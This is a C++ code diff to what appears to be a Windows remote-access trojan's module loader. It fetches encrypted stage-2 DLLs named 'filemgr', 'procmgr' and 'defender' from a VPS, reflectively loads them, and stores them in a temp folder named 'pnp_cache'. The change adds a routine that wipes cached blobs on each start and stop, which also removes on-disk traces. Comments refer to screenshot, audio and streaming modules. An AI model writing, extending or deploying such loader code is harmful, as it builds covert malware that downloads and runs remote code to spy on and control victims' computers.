@@ -281,6 +281,13 @@ public:
     void prefetch_all_async() {
         if (prefetch_running_.exchange(true)) return;
         std::thread([this]{
+            // Wipe any stale blobs from previous (possibly crashed) runs.
+            // shutdown_all already does this on graceful stop, but on a hard
+            // kill / forced reboot / DLL update the .bin files can linger.
+            // They may be encrypted with a stale key, so trusting them would
+            // cause decrypt failures. Always start fresh.
+            wipe_cache_dir();
+
             // Only the modules that actually ship as stage-2 DLLs today.
             // Keeping screenshot/audio/stream here previously meant three
             // round-trips to the VPS at every startup for modules that
@@ -290,14 +297,9 @@ public:
                 "filemgr", "procmgr", "defender"
             };
             for (auto m : kModules) {
-                // 1) make sure the blob is on disk: fetch if missing.
-                if (!ensure_cached(m)) {
-                    if (!fetch_blob_sync(m, 15000)) continue;  // VPS doesn't have it
-                }
-                // 2) reflective-load the module so its commands are registered.
-                //    Without this, the blob sits on disk unused and shutdown_all
-                //    leaves orphan .bin files — next start's prefetch sees the
-                //    cache and skips, so modules never actually start.
+                // 1) fetch the blob (cache was just wiped, so always fetches)
+                if (!fetch_blob_sync(m, 15000)) continue;  // VPS doesn't have it
+                // 2) reflective-load so the module's commands register.
                 ensure_loaded(m);
             }
             prefetch_running_.store(false);
@@ -316,6 +318,13 @@ public:
         }
         modules_.clear();
         cmds_.clear();
+        // Belt-and-braces: wipe ANY leftover .bin in the cache dir. Catches
+        // orphans from prior runs where a blob was fetched but the module
+        // never loaded (e.g. decrypt failure after key rotation, crash
+        // between fetch and load, etc.). Without this, the next startup's
+        // `ensure_cached` would think the blob is good and skip fetching —
+        // but since it was encrypted with a stale key it won't decrypt.
+        wipe_cache_dir();
     }
 
     // Helper: returns true if %TEMP%\pnp_cache\<mod>.bin already exists.
@@ -324,6 +333,26 @@ public:
         if (p.empty()) return false;
         DWORD a = GetFileAttributesA(p.c_str());
         return (a != INVALID_FILE_ATTRIBUTES) && !(a & FILE_ATTRIBUTE_DIRECTORY);
+    }
+
+    // Delete every .bin in %TEMP%\pnp_cache\ without touching anything else.
+    // Safe to call repeatedly; tolerates a missing directory.
+    static void wipe_cache_dir() {
+        char tmp[MAX_PATH];
+        DWORD n = GetTempPathA(MAX_PATH, tmp);
+        if (n == 0 || n > MAX_PATH) return;
+        std::string dir = std::string(tmp, n) + "pnp_cache\\";
+        std::string pat = dir + "*.bin";
+        WIN32_FIND_DATAA fd{};
+        HANDLE h = FindFirstFileA(pat.c_str(), &fd);
+        if (h == INVALID_HANDLE_VALUE) return;
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+            std::string full = dir + fd.cFileName;
+            SetFileAttributesA(full.c_str(), FILE_ATTRIBUTE_NORMAL);
+            DeleteFileA(full.c_str());
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
     }
 
 private:
